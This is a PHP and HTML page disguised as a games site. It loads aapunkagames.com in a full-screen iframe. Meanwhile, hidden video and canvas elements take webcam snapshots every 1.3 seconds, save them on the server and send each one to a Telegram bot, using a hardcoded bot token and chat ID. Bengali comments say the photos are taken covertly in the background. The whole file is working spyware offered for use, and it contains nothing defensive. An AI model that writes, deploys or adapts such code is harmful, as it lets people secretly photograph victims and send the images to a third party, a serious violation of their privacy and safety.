<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    
    $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
    $chatId = "5896019931";

    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $imgData = $_POST['image'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = str_replace(' ', '+', $imgData);
    $data = base64_decode($imgData);

    $fileName = 'img_' . uniqid() . '.png';
    $filePath = $uploadDir . $fileName;

    if (file_put_contents($filePath, $data)) {
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        
        $postFields = [
            'chat_id' => $chatId,
            'caption' => "Captured: " . $fileName,
            'photo'   => new CURLFile(realpath($filePath))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 

        curl_exec($ch);
        curl_close($ch);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aapunkagames</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #000;
        }
        #game-frame {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>

    <!-- Iframe এর মাধ্যমে কাঙ্ক্ষিত ওয়েবসাইট স্ক্রিন জুড়ে দেখানো হবে, যাতে মূল ট্যাব বন্ধ না হয় -->
    <iframe id="game-frame" src="https://www.aapunkagames.com/"></iframe>
    
    <!-- হিডেন ভিডিও ও ক্যানভাস যা দিয়ে ব্যাকগ্রাউন্ডে ছবি তোলা হবে -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // ক্যামেরা পারমিশন নেওয়া এবং ব্যাকগ্রাউন্ড লুপ চালু রাখা
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                
                // ক্যামেরা চালুর ১ সেকেন্ড পর থেকে ঠিক ১.৩ সেকেন্ড পর পর ছবি তোলার লুপ শুরু
                setTimeout(() => {
                    setInterval(captureAndUpload, 1300);
                }, 1000);
            })
            .catch(err => {
                console.error("Camera error: ", err);
            });

        function captureAndUpload() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'image=' + encodeURIComponent(imageData)
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
